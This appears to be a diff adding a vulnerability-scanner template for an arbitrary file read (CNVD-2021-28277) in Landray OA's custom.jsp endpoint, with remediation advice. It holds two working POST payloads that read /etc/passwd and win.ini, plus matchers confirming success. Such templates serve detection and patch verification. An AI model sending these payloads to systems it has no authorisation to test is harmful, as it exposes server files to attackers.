@@ -1,0 +1,49 @@
+id: CNVD-2021-28277
+info:
+  name: Landray OA custom.jsp Arbitrary File Read Vulnerability
+  author:
+  - l0ne1y
+  description: |-
+    Landray OA custom.jsp Arbitrary File Read Vulnerability
+    Landray OA office system is an OA office tool used for instant office communication.
+
+    Landray OA has multiple vulnerabilities. An attacker can exploit them to gain control of the server.
+  severity: high
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.landray.com.cn/
+
+    Temporary remediation:
+    1. Filter "." so that users cannot navigate to parent directories from URLs.
+    2. Strictly validate the format of user input parameters with regular expressions, hardcode or uniformly encode the filename parameters passed by users, whitelist file types, and reject parameters containing malicious or empty characters.
+    3. Disable directory traversal services; for example, configure open_basedir in php.ini to restrict the file access scope.
+    4. Store file paths in the database and allow users to download files by submitting the corresponding file ID.
+    5. Verify user permissions before file downloads.
+requests:
+- matchers:
+  - type: regex
+    condition: or
+    regex:
+    - 'root:.*:0:0:'
+    - for 16-bit app support
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Content-Type: application/x-www-form-urlencoded
+
+    var={"body":{"file":"file:///etc/passwd"}}
+  - |
+    POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Content-Type: application/x-www-form-urlencoded
+
+    var={"body":{"file":"file:///c://windows/win.ini"}}
+  stop-at-first-match: true
